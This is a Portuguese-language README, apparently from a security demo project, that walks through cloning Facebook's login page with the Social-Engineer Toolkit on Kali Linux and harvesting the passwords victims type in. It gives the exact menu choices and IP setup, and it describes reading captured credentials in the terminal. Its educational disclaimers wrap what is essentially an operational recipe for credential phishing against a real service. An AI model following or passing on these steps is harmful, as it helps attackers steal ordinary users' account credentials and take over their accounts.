# Phishing para Captura de Senhas do Facebook

## Introdução

Este README descreve um projeto de demonstração de segurança cibernética que utiliza técnicas de phishing para capturar senhas do Facebook. **Este tutorial é estritamente educacional. A realização de ataques de phishing é ilegal e antiética. Utilize estas informações apenas para aprimorar suas habilidades de segurança cibernética de maneira ética.**

## Ferramentas Utilizadas

- **Kali Linux**: Distribuição Linux projetada para testes de penetração.
- **SET (Social-Engineer Toolkit)**: Ferramenta usada para realizar ataques de engenharia social.

## Passo a Passo

### 1. Acesso Root

Primeiro, precisamos de acesso root no Kali Linux para executar as ferramentas necessárias:

```bash
sudo su
```

### 2. Iniciando o SET

Inicie o Social-Engineer Toolkit no terminal:

```bash
setoolkit
```

### 3. Selecionando o Tipo de Ataque

Selecione o tipo de ataque que deseja realizar. Neste caso, escolhemos "Social-Engineering Attacks":

```plaintext
1) Social-Engineering Attacks
```

### 4. Selecionando o Vetor de Ataque

Escolha o vetor de ataque "Web Site Attack Vectors":

```plaintext
2) Web Site Attack Vectors
```

### 5. Selecionando o Método de Ataque

Escolha o método "Credential Harvester Attack Method":

```plaintext
3) Credential Harvester Attack Method
```

### 6. Selecionando o Método Específico de Ataque

Escolha a opção "Site Cloner":

```plaintext
2) Site Cloner
```

### 7. Obtendo o Endereço IP da Máquina

Antes de continuar, precisamos obter o endereço IP da máquina para configurar o servidor de phishing. Use o comando `ifconfig`:

```bash
ifconfig
```

Anote o endereço IP exibido (por exemplo, `192.168.1.100`).

### 8. Clonando o Site

O SET solicitará o endereço IP da sua máquina e a URL que deseja clonar. Digite o endereço IP obtido e a URL do Facebook:

```plaintext
[IP address for the POST back in Harvester/Tabnabbing] (ex. http://192.168.1.5): http://192.168.1.100
Enter the url to clone: http://www.facebook.com
```

### 9. Configurando o Servidor de Phishing

Após inserir as informações, o SET clonará o site do Facebook e configurará um servidor de phishing local. Qualquer pessoa que acessar o endereço IP da sua máquina será redirecionada para a página clonada do Facebook. Quando a vítima inserir suas credenciais, elas serão capturadas e exibidas no terminal.

### 10. Captura de Credenciais

Quando a vítima digitar suas credenciais na página clonada, elas serão enviadas para o seu servidor e armazenadas. Você pode visualizar as credenciais capturadas no terminal onde o SET está sendo executado.

![Alt text](./passwd.png "Captura de tela das credenciais capturadas")

## Descobertas e Conclusão

Ao seguir os passos acima, conseguimos clonar o site do Facebook e configurar um servidor de phishing que captura as credenciais dos usuários. Esta experiência demonstrou a eficácia e a simplicidade das técnicas de phishing, enfatizando a importância de práticas de segurança robustas e conscientização sobre engenharia social.

---

**Atenção:** A execução de ataques de phishing é ilegal e antiética. Este guia é destinado apenas para fins educacionais e para aumentar a conscientização sobre a importância da segurança da informação. Utilize este conhecimento de forma responsável e ética.

## Recursos Adicionais

- [Documentação do Kali Linux](https://www.kali.org/docs/)
- [Documentação do SET (Social-Engineer Toolkit)](https://github.com/trustedsec/social-engineer-toolkit)

---

Por favor, use este conhecimento de forma responsável e ética para proteger e educar os outros sobre os perigos dos ataques de phishing.
